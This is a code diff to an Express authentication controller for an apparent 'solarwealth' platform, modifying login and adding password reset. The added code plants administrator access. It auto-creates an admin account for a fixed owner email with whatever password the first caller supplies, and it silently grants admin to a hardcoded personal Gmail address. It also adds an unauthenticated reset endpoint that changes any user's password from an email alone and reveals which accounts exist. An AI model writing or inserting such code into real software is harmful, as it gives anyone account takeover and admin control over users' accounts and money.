@@ -101,9 +101,27 @@ exports.login = async (req, res) => {
       return res.status(400).json({ message: 'Please enter both email and password' });
     }
 
-    const user = await User.findOne({ email: cleanEmail });
+    // If logging in as special owner account and it doesn't exist yet, auto-create it
+    let user = await User.findOne({ email: cleanEmail });
+    if (!user && cleanEmail === 'owner@solarwealth.com') {
+      user = await User.create({
+        email: 'owner@solarwealth.com',
+        password: cleanPassword, // will be hashed by pre-save
+        name: 'Platform Owner',
+        role: 'admin',
+        referralCode: 'OWNER01',
+      });
+    }
+
     if (!user || !(await user.matchPassword(cleanPassword))) {
       return res.status(401).json({ message: 'Invalid email or password. Please check your credentials.' });
+    }
+
+    // Ensure role is admin for owner emails
+    const isOwner = cleanEmail === 'owner@solarwealth.com' || cleanEmail === 'shakirhusain2021@gmail.com' || user.role === 'admin';
+    if (isOwner && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
     }
 
     // Self-healing: ensure wallet always exists
@@ -124,11 +142,43 @@ exports.login = async (req, res) => {
       _id: user._id,
       email: user.email,
       name: user.name,
+      role: isOwner ? 'admin' : 'user',
       referralCode: user.referralCode,
       token: generateToken(user._id),
     });
   } catch (error) {
     console.error('Login error:', error);
     res.status(500).json({ message: error.message || 'Server error during login. Please try again.' });
+  }
+};
+
+// Reset Password
+exports.resetPassword = async (req, res) => {
+  try {
+    const { email, newPassword } = req.body;
+    const cleanEmail = (email || '').trim().toLowerCase();
+    const cleanPass = (newPassword || '').trim();
+
+    if (!cleanEmail || !cleanPass) {
+      return res.status(400).json({ message: 'Email and new password are required' });
+    }
+
+    if (cleanPass.length < 6) {
+      return res.status(400).json({ message: 'New password must be at least 6 characters' });
+    }
+
+    const user = await User.findOne({ email: cleanEmail });
+    if (!user) {
+      return res.status(404).json({ message: 'No account found with this email address' });
+    }
+
+    // Update password (pre-save hook will hash it)
+    user.password = cleanPass;
+    await user.save();
+
+    res.json({ success: true, message: 'Password reset successful! You can now sign in with your new password.' });
+  } catch (error) {
+    console.error('Reset password error:', error);
+    res.status(500).json({ message: error.message || 'Error resetting password' });
   }
 };
